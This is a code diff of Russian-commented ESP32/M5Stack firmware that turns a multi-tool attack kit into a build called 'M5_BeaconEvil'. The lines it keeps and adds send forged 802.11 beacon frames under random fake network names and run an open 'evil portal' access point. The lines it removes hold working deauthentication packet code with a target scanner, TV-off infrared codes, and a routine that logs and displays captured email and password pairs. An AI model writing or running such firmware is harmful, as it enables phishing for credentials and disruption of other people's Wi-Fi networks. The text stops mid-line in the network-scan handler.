@@ -6,340 +6,129 @@
 #include <M5Unified.h>
 
 // ================= НАСТРОЙКИ =================
-const char* ssid     = "M5_Bruce"; 
+const char* ssid     = "M5_BeaconEvil"; 
 
 WebServer server(80);
 DNSServer dnsServer;
 const byte DNS_PORT = 53;
 
 bool isSpamming = false;
-bool isTvKilling = false;
-bool isDeauthing = false;
 bool isEvilPortalActive = true; 
 unsigned long lastBeaconTime = 0;
-unsigned long lastDeauthTime = 0;
 int packetCount = 0;
+int currentBurst = 100; // Начинаем со 100, потом растет
 
-#define IR_PIN 43
-
-uint8_t target_bssid[6] = {0};
-uint8_t target_channel = 1;
-bool scan_in_progress = false;
-
-String logs = "";
-
-// Прототипы
+// ================= ПРОТОТИПЫ =================
 void drawUI();
-void killTvBrand(int region, int brand);
-void killAllTv(int region);
 void sendBeaconSpam();
-void sendDeauth();
 void setupServer();
-void sendRawCode(const uint16_t *times, const uint8_t *codes, int numPairs, int bitsPerIndex, int freq);
-void savePassword(String email, String pass);
-void loadLogs();
-void saveLogsToFile();
 
-struct Theme { uint16_t bg; uint16_t text; uint16_t accent; };
-Theme themes[12] = {
-  {BLACK, WHITE, RED}, {BLACK, GREEN, GREEN}, {NAVY, CYAN, WHITE}, {MAROON, YELLOW, WHITE},
-  {DARKGREY, WHITE, ORANGE}, {PURPLE, PINK, WHITE}, {DARKGREEN, CYAN, WHITE}, {WHITE, BLACK, BLUE},
-  {DARKCYAN, WHITE, YELLOW}, {OLIVE, WHITE, YELLOW}, {BLACK, MAGENTA, CYAN}, {DARKGREY, WHITE, WHITE}
-};
-int currentTheme = 0;
+// ================= БЕКОН СПАМ =================
+void sendBeaconSpam() {
+  uint8_t packet[128] = {0};
+  
+  packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
+  for(int i=4; i<10; i++) packet[i] = 0xFF; 
+  for(int i=10; i<16; i++) packet[i] = random(0, 255);
+  for(int i=16; i<22; i++) packet[i] = packet[i-6];
+  packet[22] = 0x00; packet[23] = 0x00;
+  for(int i=24; i<32; i++) packet[i] = random(0, 255);
+  packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;
 
-const char* spam_ssids[] = {
-  "Free_Public_WiFi", "FBI_Surveillance_Van", "Virus_Detected", "Windows_Update", "Update_Required",
-  "Do_Not_Connect", "Hack_Me", "No_Internet", "WiFi_Error", "Connect_To_Continue",
-  "Fake_Network", "M5Stack_Hack", "System_Alert", "Security_Breach", "Admin_Login",
-  "Free_Money", "CIA_WiFi", "NSA_Spy", "Police_Van", "Trojan_Horse",
-  "WiFi_Stealer", "Password_Required", "Network_Error", "Access_Denied", "Router_Reset",
-  "Free_Internet", "Coffee_Shop", "Airport_WiFi", "Hotel_Guest", "McDonalds_Free",
-  "Starbucks_WiFi", "Public_Hotspot", "Free_Download", "Click_Here", "Fake_App",
-  "Update_Your_Phone", "iPhone_WiFi", "Android_Network", "Samsung_Update", "Xiaomi_WiFi",
-  "Huawei_5G", "NSA_Backdoor", "FBI_Watch", "CIA_Drone", "KGB_WiFi",
-  "Free_VPN", "Proxy_Server", "Tor_Network", "Dark_Web", "Deep_Web",
-  "Hacked_Network", "Your_Phone_Is_Infected", "Ransomware", "Pay_To_Unlock", "Bitcoin_WiFi",
-  "Free_Crypto", "Mining_Pool", "Fake_Bank", "Sberbank_WiFi", "Tinkoff_Network",
-  "VTB_Free", "Alfa_WiFi", "PayPal_Login", "Amazon_Free", "Google_WiFi",
-  "Apple_Store", "Microsoft_Update", "Windows_11_Free", "Linux_Mint", "Ubuntu_Network",
-  "Hacker_Zone", "Darknet_Market", "Black_Market", "Free_Weed", "Free_Alcohol",
-  "Free_Pizza", "Free_Beer", "Free_Sex", "Free_Drugs", "Free_Guns",
-  "Police_Department", "Ambulance", "Fire_Department", "Emergency_WiFi", "911_Network",
-  "SOS", "Help_Me", "I_Am_Lost", "Lost_Password", "Find_My_Phone",
-  "Free_Data", "Unlimited_Internet", "5G_Free", "LTE_Free", "4G_Free",
-  "WiFi_Unlimited", "No_Limit", "Free_Speed", "Fast_Internet", "Slow_Network",
-  "Broken_WiFi", "Not_Working", "Error_404", "Error_500", "Server_Down",
-  "Under_Attack", "DDoS_Attack", "SQL_Injection", "XSS_Attack", "Zero_Day",
-  "Root_Access", "Admin_Access", "Superuser", "Root_Me", "Hack_The_Planet",
-  "Free_Netflix", "Free_YouTube", "Free_Spotify", "Free_Telegram", "Free_WhatsApp",
-  "VK_Free", "OK_Free", "Instagram_Free", "TikTok_Free", "Twitter_Free",
-  "Facebook_Free", "Snapchat_Free", "Telegram_Spam", "WhatsApp_Hack", "Viber_Free",
-  "Skype_Free", "Zoom_Meeting", "Discord_Free", "Twitch_Free", "Steam_Free",
-  "Free_Games", "Free_Steam", "Free_V-Bucks", "Free_Robux", "Free_Minecraft",
-  "Free_Fortnite", "Free_PUBG", "Free_GTA", "Free_Counter-Strike", "Free_Dota",
-  "Free_LoL", "Free_Valorant", "Free_Apex", "Free_Warzone", "Free_CallOfDuty",
-  "Free_Hack", "Free_Cheat", "Free_Bot", "Free_Script", "Free_Exploit",
-  "Free_Key", "Free_License", "Free_Serial", "Free_Crack", "Free_Patch",
-  "Free_Activation", "Free_Premium", "Free_VIP", "Free_Pro", "Free_Ultimate"
-};
-const int num_ssids = sizeof(spam_ssids) / sizeof(spam_ssids[0]);
+  // Рандомим имя с бОльшим разбросом
+  char ssidBuf[32];
+  int type = random(0, 5);
+  if (type == 0) sprintf(ssidBuf, "Free_WiFi_%d", random(0, 5000));
+  else if (type == 1) sprintf(ssidBuf, "Hack_Me_%d", random(0, 5000));
+  else if (type == 2) sprintf(ssidBuf, "Virus_%d", random(0, 5000));
+  else if (type == 3) sprintf(ssidBuf, "M5Stack_%d", random(0, 5000));
+  else sprintf(ssidBuf, "Error_%d", random(0, 5000));
 
-// ================= БАЗА КОДОВ ТВ =================
-const uint16_t samsung_na_times[] = { 60, 60, 60, 2700, 120, 60, 240, 60 };
-const uint8_t samsung_na_codes[] = { 0xE2, 0x20, 0x80, 0x78, 0x88, 0x20, 0x10 };
-const int samsung_na_pairs = 26;
-const int samsung_na_freq = 38400;
+  int ssidLen = strlen(ssidBuf);
+  int len = 36;
+  
+  packet[len++] = 0x00; packet[len++] = ssidLen;
+  memcpy(&packet[len], ssidBuf, ssidLen); len += ssidLen;
+  packet[len++] = 0x03; packet[len++] = 0x01; 
+  packet[len++] = random(1, 14); 
 
-const uint16_t lg_na_times[] = { 50, 100, 50, 200, 50, 800, 400, 400 };
-const uint8_t lg_na_codes[] = { 0xD5, 0x41, 0x11, 0x00, 0x14, 0x44, 0x6D, 0x54, 0x11, 0x10, 0x01, 0x44, 0x45 };
-const int lg_na_pairs = 52;
-const int lg_na_freq = 57143;
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
+  packetCount++;
+}
 
-const uint16_t philips_eu_times[] = { 36, 36, 36, 105, 36, 800, 400, 400 };
-const uint8_t philips_eu_codes[] = { 0x0C, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-const int philips_eu_pairs = 14;
-const int philips_eu_freq = 36000;
-
-const uint16_t pana_eu_times[] = { 26, 185, 27, 80, 27, 185, 27, 4549 };
-const uint8_t pana_eu_codes[] = { 0x15, 0x5A, 0x65, 0x67, 0x95, 0x65, 0x9A, 0x9B, 0x99 };
-const int pana_eu_pairs = 64;
-const int pana_eu_freq = 38610;
-
-// ================= HTML WEBUI (ИСПРАВЛЕННЫЙ JS) =================
+// ================= HTML WEBUI =================
 const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE HTML><html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>M5 BRUCE</title>
+  <title>M5_BeaconEvil</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Courier New', monospace; }
     body { background: #000; color: #fff; overflow: hidden; }
-    #app { height: 100vh; display: flex; flex-direction: column; position: relative; overflow: hidden; }
+    #app { height: 100vh; display: flex; flex-direction: column; padding: 20px; }
     
-    .page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; padding: 20px 20px 80px 20px; display: none; flex-direction: column; overflow-y: auto; background: #000; }
-    .page.active { display: flex; } /* ВОТ ГЛАВНОЕ ИСПРАВЛЕНИЕ: используем display: none / flex вместо transform */
+    h1 { font-size: 20px; color: #0f0; margin-bottom: 20px; text-transform: uppercase; border-bottom: 2px dashed #0f0; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; text-align: center; }
     
-    h1 { font-size: 20px; color: #0f0; margin-bottom: 15px; text-transform: uppercase; border-bottom: 2px dashed #0f0; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; }
-    h2 { font-size: 16px; color: #fff; margin-bottom: 15px; margin-top: 20px; text-transform: uppercase; }
-    
-    .menu-btn { background: #000; border: 2px solid #fff; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; color: #fff; }
-    .menu-btn:active { background: #fff; color: #000; }
-    .menu-btn .text { font-size: 16px; font-weight: bold; flex: 1; text-align: left; }
-    .menu-btn .icon { font-size: 20px; margin-right: 10px; }
-    
-    button { background: #000; color: #fff; border: 2px solid #fff; padding: 12px; width: 100%; font-weight: bold; font-size: 14px; cursor: pointer; margin-bottom: 10px; text-transform: uppercase; }
+    button { background: #000; color: #fff; border: 2px solid #fff; padding: 20px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; margin-bottom: 15px; text-transform: uppercase; }
     button:active { background: #fff; color: #000; }
+    button.active { background: #0f0; color: #000; border-color: #0f0; }
     
-    select { padding: 10px; width: 100%; margin-bottom: 15px; background: #000; color: #fff; border: 2px solid #fff; font-size: 14px; outline: none; }
+    .status-box { padding: 15px; background: #000; border: 2px solid #fff; margin-bottom: 20px; font-size: 14px; text-transform: uppercase; text-align: center; }
+    .status-on { color: #0f0; border-color: #0f0; }
+    .status-off { color: #f00; border-color: #f00; }
     
-    #backBtn { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; color: #000; border: none; padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer; z-index: 100; display: none; }
-    #backBtn:active { background: #555; }
-    
-    .status-box { padding: 10px; background: #000; border: 2px solid #fff; margin-bottom: 15px; font-size: 12px; text-transform: uppercase; }
-    
-    #scan-results { max-height: 200px; overflow-y: auto; background: #000; border: 2px solid #fff; padding: 10px; margin-bottom: 15px; text-align: left; font-size: 12px; }
-    .net-item { padding: 8px; border-bottom: 1px dashed #555; cursor: pointer; }
-    .net-item:active { background: #fff; color: #000; }
-    .net-item.selected { background: #fff; color: #000; font-weight: bold; }
-    
-    #logs { background: #000; color: #0f0; font-size: 11px; padding: 10px; border: 2px solid #fff; height: 150px; overflow-y: auto; margin-bottom: 15px; white-space: pre-wrap; }
-    .hidden { display: none !important; }
-    .btn-row { display: flex; gap: 5px; }
+    .info { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
   </style>
 </head>
 <body>
   <div id="app">
-    <div id="page-main" class="page active">
-      <h1>M5 BRUCE</h1>
-      <div class="menu-btn" onclick="goTo('page-wifi')">
-        <span class="icon">[+]</span><span class="text">WI-FI</span><span class="arrow">></span>
-      </div>
-      <div class="menu-btn" onclick="goTo('page-ir')">
-        <span class="icon">[~]</span><span class="text">ИК-ПУЛЬТ</span><span class="arrow">></span>
-      </div>
-      <div class="menu-btn" onclick="goTo('page-logs')">
-        <span class="icon">[*]</span><span class="text">ЛОГИ</span><span class="arrow">></span>
-      </div>
-    </div>
+    <h1>M5_BeaconEvil</h1>
+    
+    <div class="status-box" id="status-wifi">BEACON SPAM: ВЫКЛЮЧЕН</div>
+    <button id="btnWifi" onclick="toggleWifi()">ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)</button>
 
-    <div id="page-wifi" class="page">
-      <h1>WI-FI</h1>
-      <button onclick="goTo('page-deauth')">DEAUTH</button>
-      <button onclick="goTo('page-beacon')">BEACON SPAM</button>
-      <button onclick="goTo('page-portal')">EVIL PORTAL</button>
-    </div>
+    <div class="status-box" id="status-portal">EVIL PORTAL: АКТИВЕН</div>
+    <button id="btnPortal" onclick="togglePortal()">ОСТАНОВИТЬ ПОРТАЛ</button>
 
-    <div id="page-deauth" class="page">
-      <h1>DEAUTH</h1>
-      <button onclick="scanNetworks()">СКАНИРОВАТЬ</button>
-      <div id="scan-results">НАЖМИТЕ</div>
-      <button id="btnDeauth" onclick="toggleDeauth()" class="hidden">АТАКОВАТЬ</button>
-      <div id="status-deauth" class="status-box">НЕ АКТИВНО</div>
-    </div>
-
-    <div id="page-beacon" class="page">
-      <h1>BEACON SPAM</h1>
-      <button id="btnWifi" onclick="toggleWifi()">ЗАГРУЗКА...</button>
-      <div id="status-wifi" class="status-box">ПРОВЕРКА...</div>
-    </div>
-
-    <div id="page-portal" class="page">
-      <h1>EVIL PORTAL</h1>
-      <button id="btnPortal" onclick="togglePortal()">ЗАПУСТИТЬ</button>
-      <div id="status-portal" class="status-box">НЕ АКТИВНО</div>
-      <h2>ДАННЫЕ:</h2>
-      <div id="logs">ОЖИДАНИЕ...</div>
-    </div>
-
-    <div id="page-ir" class="page">
-      <h1>ИК-ПУЛЬТ</h1>
-      <button onclick="goTo('page-tvbg-na')">REGION NA</button>
-      <button onclick="goTo('page-tvbg-eu')">REGION EU</button>
-    </div>
-
-    <div id="page-tvbg-na" class="page">
-      <h1>TV-B-GONE NA</h1>
-      <select id="tvSelectNA">
-        <option value="0">SAMSUNG</option>
-        <option value="1">LG</option>
-      </select>
-      <button onclick="killTvNA()">ВЫКЛЮЧИТЬ</button>
-      <button onclick="killAllNA()">ВЫКЛЮЧИТЬ ВСЕ</button>
-      <div id="status-tv-na" class="status-box">ОЖИДАНИЕ...</div>
-    </div>
-
-    <div id="page-tvbg-eu" class="page">
-      <h1>TV-B-GONE EU</h1>
-      <select id="tvSelectEU">
-        <option value="0">PHILIPS</option>
-        <option value="1">PANASONIC</option>
-      </select>
-      <button onclick="killTvEU()">ВЫКЛЮЧИТЬ</button>
-      <button onclick="killAllEU()">ВЫКЛЮЧИТЬ ВСЕ</button>
-      <div id="status-tv-eu" class="status-box">ОЖИДАНИЕ...</div>
-    </div>
-
-    <div id="page-logs" class="page">
-      <h1>ЛОГИ</h1>
-      <div class="btn-row">
-        <button onclick="downloadLogs()">СКАЧАТЬ</button>
-        <button onclick="clearLogs()">ОЧИСТИТЬ</button>
-      </div>
-      <div id="logs-main">ПУСТО...</div>
-    </div>
-
-    <button id="backBtn" onclick="goBack()">< НАЗАД</button>
+    <div class="info">Подключись к сети M5_BeaconEvil без пароля. Портал откроется автоматически.</div>
   </div>
 
   <script>
-    let history = ['page-main'];
-
-    function goTo(pageId) {
-      // Прячем все страницы
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      // Показываем нужную
-      document.getElementById(pageId).classList.add('active');
-      // Запоминаем историю
-      history.push(pageId);
-      // Показываем кнопку "Назад", если мы не на главной
-      document.getElementById('backBtn').style.display = (pageId === 'page-main') ? 'none' : 'block';
-      
-      if(pageId === 'page-logs') fetchLogs();
-    }
-
-    function goBack() {
-      if(history.length > 1) {
-        history.pop();
-        let prev = history[history.length - 1];
-        goTo(prev);
-        // Убираем дублирование в истории при возврате
-        history.pop(); 
-      }
-    }
-
-    // Wi-Fi Spam
     let isWifiOn = false;
+    let isPortalOn = true;
+
     function toggleWifi() {
-      let ep = isWifiOn ? '/wifi/off' : '/wifi/on';
-      fetch(ep).then(r => r.text()).then(() => {
+      fetch(isWifiOn ? '/wifi/off' : '/wifi/on').then(r => r.text()).then(() => {
         isWifiOn = !isWifiOn;
-        document.getElementById('btnWifi').innerText = isWifiOn ? 'ВЫКЛЮЧИТЬ' : 'ВКЛЮЧИТЬ';
-        document.getElementById('status-wifi').innerText = isWifiOn ? 'АКТИВЕН' : 'ВЫКЛЮЧЕН';
+        updateUI();
       });
     }
 
-    // Deauth
-    let isDeauthOn = false;
-    let selectedBssid = "";
-    let selectedChannel = 0;
-    function scanNetworks() {
-      document.getElementById('scan-results').innerText = "СКАНИРОВАНИЕ... (10-15 СЕК)";
-      fetch('/scan').then(r => r.text()).then(data => {
-        document.getElementById('scan-results').innerHTML = data;
-        document.querySelectorAll('.net-item').forEach(item => {
-          item.onclick = function() {
-            document.querySelectorAll('.net-item').forEach(i => i.classList.remove('selected'));
-            this.classList.add('selected');
-            selectedBssid = this.dataset.bssid;
-            selectedChannel = this.dataset.channel;
-            document.getElementById('btnDeauth').classList.remove('hidden');
-            document.getElementById('status-deauth').innerText = "ВЫБРАНА: " + this.dataset.ssid;
-          };
-        });
-      });
-    }
-    function toggleDeauth() {
-      if(!selectedBssid) { alert("ВЫБЕРИ СЕТЬ!"); return; }
-      let ep = isDeauthOn ? '/deauth/off' : '/deauth/on?bssid=' + selectedBssid + '&channel=' + selectedChannel;
-      fetch(ep).then(r => r.text()).then(() => {
-        isDeauthOn = !isDeauthOn;
-        let btn = document.getElementById('btnDeauth');
-        let stat = document.getElementById('status-deauth');
-        btn.innerText = isDeauthOn ? 'ОСТАНОВИТЬ' : 'АТАКОВАТЬ';
-        stat.innerText = isDeauthOn ? 'АТАКА!' : 'НЕ АКТИВНО';
-      });
-    }
-
-    // Portal
-    let isPortalOn = false;
     function togglePortal() {
-      let ep = isPortalOn ? '/portal/off' : '/portal/on';
-      fetch(ep).then(r => r.text()).then(() => {
+      fetch(isPortalOn ? '/portal/off' : '/portal/on').then(r => r.text()).then(() => {
         isPortalOn = !isPortalOn;
-        let btn = document.getElementById('btnPortal');
-        let stat = document.getElementById('status-portal');
-        btn.innerText = isPortalOn ? 'ОСТАНОВИТЬ' : 'ЗАПУСТИТЬ';
-        stat.innerText = isPortalOn ? 'АКТИВЕН' : 'НЕ АКТИВНО';
+        updateUI();
       });
     }
 
-    // Logs
-    function fetchLogs() {
-      fetch('/logs').then(r => r.text()).then(t => {
-        document.getElementById('logs-main').innerText = t;
-        document.getElementById('logs').innerText = t;
-      });
+    function updateUI() {
+      let btnW = document.getElementById('btnWifi');
+      let statW = document.getElementById('status-wifi');
+      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ СПАМ'; btnW.classList.add('active'); statW.innerText = 'BEACON SPAM: НАКОПИТЕЛЬНЫЙ'; statW.className = 'status-box status-on'; }
+      else { btnW.innerText = 'ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)'; btnW.classList.remove('active'); statW.innerText = 'BEACON SPAM: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }
+
+      let btnP = document.getElementById('btnPortal');
+      let statP = document.getElementById('status-portal');
+      if(isPortalOn) { btnP.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; btnP.classList.add('active'); statP.innerText = 'EVIL PORTAL: АКТИВЕН'; statP.className = 'status-box status-on'; }
+      else { btnP.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; btnP.classList.remove('active'); statP.innerText = 'EVIL PORTAL: ВЫКЛЮЧЕН'; statP.className = 'status-box status-off'; }
     }
-    function downloadLogs() { window.location.href = '/download_logs'; }
-    function clearLogs() { fetch('/clear_logs').then(() => { document.getElementById('logs-main').innerText = "ПУСТО"; document.getElementById('logs').innerText = "ОЖИДАНИЕ"; }); }
 
-    // IR
-    function killTvNA() { fetch('/tv/kill?region=0&brand=' + document.getElementById('tvSelectNA').value).then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; }); }
-    function killAllNA() { fetch('/tv/killall?region=0').then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; }); }
-    function killTvEU() { fetch('/tv/kill?region=1&brand=' + document.getElementById('tvSelectEU').value).then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; }); }
-    function killAllEU() { fetch('/tv/killall?region=1').then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; }); }
-
-    setInterval(() => {
-      if(document.getElementById('page-beacon').classList.contains('active')) {
-        fetch('/status').then(r => r.text()).then(t => {
-          isWifiOn = (t === 'ON');
-          document.getElementById('btnWifi').innerText = isWifiOn ? 'ВЫКЛЮЧИТЬ' : 'ВКЛЮЧИТЬ';
-          document.getElementById('status-wifi').innerText = isWifiOn ? 'АКТИВЕН' : 'ВЫКЛЮЧЕН';
-        });
-      }
-    }, 3000);
+    fetch('/status').then(r => r.text()).then(t => {
+      if(t.includes('WIFI_ON')) isWifiOn = true;
+      if(t.includes('PORTAL_ON')) isPortalOn = true;
+      updateUI();
+    });
   </script>
 </body>
 </html>
@@ -380,265 +169,52 @@ const char portal_html[] PROGMEM = R"rawliteral(
 </body></html>
 )rawliteral";
 
-// ================= ЛОГИ =================
-void loadLogs() {
-  File f = SPIFFS.open("/logs.txt", "r");
-  if (f) { logs = f.readString(); f.close(); }
-}
-
-void saveLogsToFile() {
-  File f = SPIFFS.open("/logs.txt", "w");
-  if (f) { f.print(logs); f.close(); }
-}
-
-void savePassword(String email, String pass) {
-  logs += "Email: " + email + "\nPass: " + pass + "\n---\n";
-  saveLogsToFile();
-  M5.Display.fillScreen(BLACK);
-  M5.Display.setTextColor(WHITE);
-  M5.Display.setCursor(10, 10);
-  M5.Display.print("PASS CAPTURED!");
-  M5.Display.setCursor(10, 30);
-  M5.Display.print(email);
-  M5.Display.setCursor(10, 50);
-  M5.Display.print(pass);
-  delay(3000);
-  drawUI();
-}
-
 // ================= ОТРИСОВКА МЕНЮ =================
 void drawUI() {
-  Theme t = themes[currentTheme];
-  M5.Display.fillScreen(t.bg);
-  M5.Display.setTextColor(t.text);
+  M5.Display.fillScreen(BLACK);
+  M5.Display.setTextColor(WHITE);
   M5.Display.setTextSize(2);
   M5.Display.setCursor(10, 10);
-  M5.Display.print("BRUCE");
-  M5.Display.drawLine(0, 35, 135, 35, t.accent);
+  M5.Display.print("M5_BeaconEvil");
+  M5.Display.drawLine(0, 35, 135, 35, GREEN);
   
   M5.Display.setTextSize(1);
   M5.Display.setCursor(10, 45);
-  M5.Display.print("Beacon: ");
-  M5.Display.setTextColor(isSpamming ? t.accent : t.text);
-  M5.Display.print(isSpamming ? "ON" : "OFF");
+  M5.Display.print("Spam: ");
+  M5.Display.setTextColor(isSpamming ? GREEN : RED);
+  M5.Display.print(isSpamming ? "ACTIVE" : "OFF");
   
-  M5.Display.setTextColor(t.text);
+  M5.Display.setTextColor(WHITE);
   M5.Display.setCursor(10, 60);
-  M5.Display.print("Deauth: ");
-  M5.Display.setTextColor(isDeauthing ? RED : t.text);
-  M5.Display.print(isDeauthing ? "ACTIVE" : "OFF");
-  
-  M5.Display.setTextColor(t.text);
-  M5.Display.setCursor(10, 75);
   M5.Display.print("Portal: ");
-  M5.Display.setTextColor(isEvilPortalActive ? MAGENTA : t.text);
-  M5.Display.print(isEvilPortalActive ? "ON" : "OFF");
-  
-  M5.Display.setTextColor(t.text);
-  M5.Display.setCursor(10, 90);
+  M5.Display.setTextColor(isEvilPortalActive ? GREEN : RED);
+  M5.Display.print(isEvilPortalActive ? "ACTIVE" : "OFF");
+
+  M5.Display.setTextColor(WHITE);
+  M5.Display.setCursor(10, 75);
   M5.Display.print("Packets: "); M5.Display.print(packetCount);
-  M5.Display.setCursor(10, 105);
+  M5.Display.setCursor(10, 90);
   M5.Display.print("IP: ");
   M5.Display.print(WiFi.softAPIP());
-  
-  if (isDeauthing) {
-    M5.Display.setTextColor(RED);
-    M5.Display.setCursor(10, 120);
-    M5.Display.print("Target: ");
-    char bssid_str[18];
-    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5]);
-    M5.Display.print(bssid_str);
-  }
-}
-
-// ================= ДЕАУТ =================
-void sendDeauth() {
-  uint8_t packet[26] = {
-    0xC0, 0x00, 0x00, 0x00, 
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-    target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5], 
-    target_bssid[0], target_bssid[1], target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5], 
-    0x00, 0x00, 0x07, 0x00  
-  };
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
-  packetCount++;
-}
-
-// ================= ИК ОТПРАВКА =================
-void sendRawCode(const uint16_t *times, const uint8_t *codes, int numPairs, int bitsPerIndex, int freq) {
-  ledcAttach(IR_PIN, freq, 8);
-  
-  int bitPos = 0;
-  for (int i = 0; i < numPairs; i++) {
-    uint8_t val = 0;
-    for (int b = 0; b < bitsPerIndex; b++) {
-      if (bitPos / 8 >= numPairs) break;
-      val |= ((codes[bitPos / 8] >> (7 - (bitPos % 8))) & 1) << (bitsPerIndex - 1 - b);
-      bitPos++;
-    }
-    
-    if (val < 8) {
-      ledcWrite(IR_PIN, 128);
-      delayMicroseconds(times[val * 2]);
-      ledcWrite(IR_PIN, 0);
-      delayMicroseconds(times[val * 2 + 1]);
-    }
-  }
-}
-
-void killTvBrand(int region, int brand) {
-  isTvKilling = true;
-  M5.Display.fillScreen(BLACK);
-  M5.Display.setTextColor(RED);
-  M5.Display.setTextSize(2);
-  M5.Display.setCursor(10, 40);
-  M5.Display.print("FIRE!");
-  
-  for (int j = 0; j < 3; j++) {
-    if (region == 0) {
-      if (brand == 0) sendRawCode(samsung_na_times, samsung_na_codes, samsung_na_pairs, 2, samsung_na_freq);
-      else if (brand == 1) sendRawCode(lg_na_times, lg_na_codes, lg_na_pairs, 2, lg_na_freq);
-    } else {
-      if (brand == 0) sendRawCode(philips_eu_times, philips_eu_codes, philips_eu_pairs, 2, philips_eu_freq);
-      else if (brand == 1) sendRawCode(pana_eu_times, pana_eu_codes, pana_eu_pairs, 2, pana_eu_freq);
-    }
-    delay(50);
-  }
-  
-  isTvKilling = false;
-  drawUI();
-}
-
-void killAllTv(int region) {
-  isTvKilling = true;
-  M5.Display.fillScreen(BLACK);
-  M5.Display.setTextColor(RED);
-  M5.Display.setTextSize(2);
-  M5.Display.setCursor(10, 40);
-  M5.Display.print("KILL ALL");
-  
-  for (int j = 0; j < 3; j++) {
-    if (region == 0) {
-      sendRawCode(samsung_na_times, samsung_na_codes, samsung_na_pairs, 2, samsung_na_freq);
-      delay(50);
-      sendRawCode(lg_na_times, lg_na_codes, lg_na_pairs, 2, lg_na_freq);
-    } else {
-      sendRawCode(philips_eu_times, philips_eu_codes, philips_eu_pairs, 2, philips_eu_freq);
-      delay(50);
-      sendRawCode(pana_eu_times, pana_eu_codes, pana_eu_pairs, 2, pana_eu_freq);
-    }
-    delay(100);
-  }
-  
-  isTvKilling = false;
-  drawUI();
-}
-
-// ================= СПАМ =================
-void sendBeaconSpam() {
-  uint8_t packet[128] = {0};
-  packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
-  for(int i=4; i<10; i++) packet[i] = 0xFF; 
-  for(int i=10; i<16; i++) packet[i] = random(0, 255);
-  for(int i=16; i<22; i++) packet[i] = random(0, 255);
-  packet[22] = 0x00; packet[23] = 0x00;
-  for(int i=24; i<32; i++) packet[i] = random(0, 255);
-  packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;
-
-  int ssidIndex = random(0, num_ssids);
-  int ssidLen = strlen(spam_ssids[ssidIndex]);
-  int len = 36;
-  
-  packet[len++] = 0x00; packet[len++] = ssidLen;
-  memcpy(&packet[len], spam_ssids[ssidIndex], ssidLen); len += ssidLen;
-  packet[len++] = 0x03; packet[len++] = 0x01; 
-  packet[len++] = random(1, 14); 
-
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
-  packetCount++;
 }
 
 // ================= ВЕБ-СЕРВЕР =================
 void setupServer() {
   server.on("/", HTTP_GET, [](){ server.send_P(200, "text/html", index_html); });
   
-  server.on("/wifi/on", HTTP_GET, [](){ isSpamming = true; drawUI(); server.send(200, "text/plain", "ON"); });
-  server.on("/wifi/off", HTTP_GET, [](){ isSpamming = false; drawUI(); server.send(200, "text/plain", "OFF"); });
-  server.on("/status", HTTP_GET, [](){ server.send(200, "text/plain", isSpamming ? "ON" : "OFF"); });
-  
-  server.on("/logs", HTTP_GET, [](){ server.send(200, "text/plain", logs); });
-  
-  server.on("/download_logs", HTTP_GET, [](){
-    server.sendHeader("Content-Disposition", "attachment; filename=logs.txt");
-    server.send(200, "text/plain", logs);
+  server.on("/wifi/on", HTTP_GET, [](){ 
+    isSpamming = true; 
+    currentBurst = 100; // Сбрасываем счетчик при старте
+    drawUI(); 
+    server.send(200, "text/plain", "ON"); 
   });
   
-  server.on("/clear_logs", HTTP_GET, [](){
-    logs = "";
-    SPIFFS.remove("/logs.txt");
-    server.send(200, "text/plain", "CLEARED");
+  server.on("/wifi/off", HTTP_GET, [](){ 
+    isSpamming = false; 
+    drawUI(); 
+    server.send(200, "text/plain", "OFF"); 
   });
-
-  server.on("/scan", HTTP_GET, [](){
-    if(scan_in_progress) { server.send(200, "text/html", "СКАНИРОВАНИЕ УЖЕ ИДЕТ..."); return; }
-    scan_in_progress = true;
-    int n = WiFi.scanNetworks();
-    String html = "";
-    if (n == 0) html = "СЕТИ НЕ НАЙДЕНЫ.";
-    else {
-      for (int i = 0; i < n; ++i) {
-        String s = WiFi.SSID(i);
-        if(s.length() == 0) s = "[СКРЫТАЯ]";
-        String bssid = WiFi.BSSIDstr(i);
-        int ch = WiFi.channel(i);
-        int rssi = WiFi.RSSI(i);
-        html += "<div class='net-item' data-bssid='" + bssid + "' data-channel='" + String(ch) + "' data-ssid='" + s + "'>";
